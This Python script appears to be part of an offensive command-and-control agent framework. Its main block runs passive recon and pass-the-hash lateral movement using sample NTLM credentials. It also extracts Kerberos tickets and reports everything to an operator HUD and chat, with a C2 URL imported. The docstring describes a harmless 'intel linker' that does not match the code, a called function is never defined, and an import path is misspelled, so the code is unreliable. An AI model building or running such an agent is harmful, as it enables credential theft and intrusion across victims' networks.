"""
Intel Linker - CrossComPJxAI
Links and correlates collected recon intel for operator review.
"""

from datetime import datetime
from config import C2_URL, OPERATOR_ID
from core.ai.intel_linker import link_intel
from cp_opereatorex.comms.comlink_ai import ComLinkAI
from core.opsec.anomaly_watchdog import AnomalyWatchdog
from core.ai.ai_task_suggest import suggest_tasks
from core.lateral.pass_the_hash import automate_lateral_movement
from core.lateral.kerberos_probe import extract_kerberos_tickets
from core.recon.recon_ai import passive_recon

com = ComLinkAI()
watchdog = AnomalyWatchdog()

def log_event(msg):
    with open("agent.log", "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

if __name__ == "__main__":
    com.send_to_hud("Agent started.")
    info = get_device_info()
    com.operator_chat(f"Recon: {info}")

    recon_data = passive_recon()
    com.send_to_hud(f"Recon data: {recon_data}")

    creds = {"admin": {"NTLM": "hash"}}  # Example
    automate_lateral_movement(creds)
    tickets = extract_kerberos_tickets()
    com.send_to_hud(f"Kerberos tickets: {tickets}")

    tasks = suggest_tasks(info)
    com.send_to_hud(f"AI Suggest: {tasks}")

    # Example usage
    a = {"host": "target1", "ip": "10.0.0.1"}
    b = {"host": "target2", "ip": "10.0.0.2"}
    linked = link_intel(a, b)
    print(f"Linked Intel: {linked}")